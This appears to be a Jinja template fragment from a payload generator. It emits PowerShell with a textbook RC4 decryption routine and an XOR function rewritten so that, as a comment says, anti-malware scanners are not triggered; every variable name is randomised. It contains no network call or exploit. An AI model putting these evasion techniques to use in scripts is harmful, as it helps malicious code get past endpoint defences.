{#- Since `-bxor` triggers some anti malware scanners, use this trick -#}
function {{symbol_name("xor")}} {
    param (${{symbol_name('A')}}, ${{symbol_name('B')}});
    return [Byte]((-bnot(${{symbol_name('A')}} -band ${{symbol_name('B')}})) -band (-bnot((-bnot ${{symbol_name('A')}}) -band (-bnot ${{symbol_name('B')}}))))
};

{#- Text book implementation of RC4 -#}

function {{symbol_name("Decrypt-RC4")}} {
    param (${{symbol_name('data')}}, ${{symbol_name('key')}});
    ${{symbol_name('s')}} = New-Object Byte[] 256;
    ${{symbol_name('k')}} = New-Object Byte[] 256;

    for (${{symbol_name('i')}} = 0; ${{symbol_name('i')}} -lt 256; ${{symbol_name('i')}}++)
    {
        ${{symbol_name('s')}}[${{symbol_name('i')}}] = [Byte]${{symbol_name('i')}};
        ${{symbol_name('k')}}[${{symbol_name('i')}}] = ${{symbol_name('key')}}[${{symbol_name('i')}} % ${{symbol_name('key')}}.Length];
    };

    ${{symbol_name('j')}} = 0;
    for (${{symbol_name('i')}} = 0; ${{symbol_name('i')}} -lt 256; ${{symbol_name('i')}}++)
    {
        ${{symbol_name('j')}} = (${{symbol_name('j')}} + ${{symbol_name('s')}}[${{symbol_name('i')}}] + ${{symbol_name('k')}}[${{symbol_name('i')}}]) % 256;
        ${{symbol_name('m')}} = ${{symbol_name('s')}}[${{symbol_name('i')}}];
        ${{symbol_name('s')}}[${{symbol_name('i')}}] = ${{symbol_name('s')}}[${{symbol_name('j')}}];
        ${{symbol_name('s')}}[${{symbol_name('j')}}] = ${{symbol_name('m')}};
    };

    ${{symbol_name('i')}} = ${{symbol_name('j')}} = 0;
    for (${{symbol_name('x')}} = 0; ${{symbol_name('x')}} -lt ${{symbol_name('data')}}.Length; ${{symbol_name('x')}}++)
    {
        ${{symbol_name('i')}} = (${{symbol_name('i')}} + 1) % 256;
        ${{symbol_name('j')}} = (${{symbol_name('j')}} + ${{symbol_name('s')}}[${{symbol_name('i')}}]) % 256;
        ${{symbol_name('m')}} = ${{symbol_name('s')}}[${{symbol_name('i')}}];
        ${{symbol_name('s')}}[${{symbol_name('i')}}] = ${{symbol_name('s')}}[${{symbol_name('j')}}];
        ${{symbol_name('s')}}[${{symbol_name('j')}}] = ${{symbol_name('m')}};
        [int]${{symbol_name('t')}} = (${{symbol_name('s')}}[${{symbol_name('i')}}] + ${{symbol_name('s')}}[${{symbol_name('j')}}]) % 256;
        ${{symbol_name('data')}}[${{symbol_name('x')}}] = {{symbol_name("xor")}} ${{symbol_name('data')}}[${{symbol_name('x')}}] ${{symbol_name('s')}}[${{symbol_name('t')}}];
    };

    ${{symbol_name('data')}}
};
